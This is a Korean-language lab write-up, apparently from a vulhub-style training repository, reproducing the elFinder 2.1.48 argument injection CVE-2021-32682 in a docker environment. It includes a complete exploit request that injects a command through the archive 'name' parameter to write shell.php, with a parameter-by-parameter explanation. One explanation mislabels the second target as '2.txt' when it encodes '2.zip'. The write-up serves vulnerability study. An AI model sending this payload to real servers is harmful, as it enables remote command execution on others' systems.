# elFinder ZIP 인수 삽입이 명령어 삽입으로 이어짐(CVE-2021-32682)

[한국어 버전(Korean version)]

elFinder는 jQuery UI를 사용하여 JavaScript로 작성된 웹용 오픈 소스 파일 관리자입니다.

elFinder 2.1.48 버전과 이전 버전에서 Arguments Injection이 발견되었습니다. 이 취약점을 통해 최소한의 구성이라도 elFinder PHP connector를 호스팅하는 서버에서 임의의 명령을 실행할 수 있습니다. 이 문제는 2.1.59에서 패치되었습니다. 반드시 인증 없이 노출되게 하지 마세요.

참고 자료:

* https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities
* https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt
* https://xz.aliyun.com/t/10739

## 취약점 환경
elFinder 2.1.48를 시작할려면 다음 명령을 실행하십시오:<br>
<pre><code>docker compose up -d</code></pre>
서버가 시작된 후 <code>http://your-ip:8080</code>에서 elFinder의 메인 페이지를 볼 수 있습니다.

## 취약점 재현
먼저, 이 취약점 흐름을 위해 2개의 파일을 준비헤야됩니다.<br><br>
<code>1.txt</code>라는 일반 텍스트 파일을 만듭니다.:<br><br>
![1](https://github.com/Tjdmin1/whitehat-school-vulhub/blob/main/elfinder/CVE-2021-32682/1.png)

마우스 오른쪽 버튼 클릭 메뉴에서 이 파일을 ZIP 형식으로 보관하고 보관된 파일 이름을 <code>2.zip</code>로 수정합니다.:

![2](https://github.com/Tjdmin1/whitehat-school-vulhub/blob/main/elfinder/CVE-2021-32682/2.png)

<code>1.txt</code>와 <code>2.zip</code>가 여기 준비되었습니다.:

![3](https://github.com/Tjdmin1/whitehat-school-vulhub/blob/main/elfinder/CVE-2021-32682/3.png)

그 다음, 임의의 명령을 실행하기위해 아래의 요청을 보냅니다.
<pre><code>GET /php/connector.minimal.php?cmd=archive&name=-TvTT=id>shell.php%20%23%20a.zip&target=l1_Lw&targets%5B1%5D=l1_Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip HTTP/1.1
Host: your-ip
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://localhost.lan:8080/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close 

 
</code></pre>

이 요청에서는 3가지 중요한 매개변수를 볼 수 있습니다.

- <code>name</code>의 값은 <code>-TvTT=id>shell.php # a.zip</code>랑 같으며,<code>id>shell.php</code>를 임의의 명령어로 수정할 수 있다.
- <code>targets[0]</code>의 값은 <code>l1_MS50eHQ</code>랑 같으며,<code>l1</code>는 첫번째 storage volume을 의미하며,<code>MS50eHQ</code>는 <code>1.txt</code>의 문자를 base64로 인코딩한 것입니다.
- <code>targets[1]</code>의 값은 <code>l1_Mi56aXA</code>랑 같으며,<code>li</code>는 첫번째 storage volume을 의미하며,<code>Mi56aXA</code>는 <code>2.txt</code>의 문자를 base64로 인코딩한 것입니다.

비록 이 요청은 에러 메세지를 응답하지만, 명령이 실행되어 <code>shell.php</code>가 <code>http://your-ip:8080/files/shell.php</code>위치에 기록되었습니다.

![4](https://github.com/Tjdmin1/whitehat-school-vulhub/blob/main/elfinder/CVE-2021-32682/4.png)
